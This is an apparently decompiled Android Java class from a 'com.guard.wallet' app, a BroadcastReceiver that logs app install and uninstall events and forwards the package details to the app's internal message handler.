package com.guard.wallet.receiver;

import com.guard.wallet.core.AppUtils;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.AppInfo;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;
import java.util.Objects;

public class PackageReceiver extends BroadcastReceiver {
    private static final String TAG = "PackageReceiver";
    public Integer a = 0;

    @Override
    public final void onReceive(Context context, Intent intent) {
        try {
            this.a = 1;

            if (intent == null) {
                return;
            }
            if (AppUtils.B(intent.getAction())) {
                return;
            }

            Log.d(TAG, intent.getAction());

            String packageName = intent.getDataString();
            if (!AppUtils.B(packageName)) {
                packageName = packageName.replaceAll("package:", "");
            }

            String action = intent.getAction();
            AppInfo appInfo = null;

            if ("android.intent.action.PACKAGE_ADDED".equals(action)) {
                Log.d(TAG, "安装了:" + packageName + "包名的程序");
                appInfo = SystemHelper.d0(packageName);
            } else if ("android.intent.action.PACKAGE_REMOVED".equals(action)) {
                Log.d(TAG, "卸载了:" + packageName + "包名的程序");
                appInfo = new AppInfo();
                appInfo.setPackageName(packageName);
                appInfo.setUninstalled(1);
                if (Objects.equals(packageName, "com.google.guard")) {
                    SharedPrefsManager.w("powerControlState:" .concat("com.google.guard"));
                }
            }

            if (appInfo == null) {
                return;
            }

            MessageRecordVO record = new MessageRecordVO();
            record.setIntentCode(intent.getAction());
            record.setExtraBody(appInfo);
            MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
        } catch (Exception ex) {
            AppUtils.s(TAG, ex);
        }
    }
}
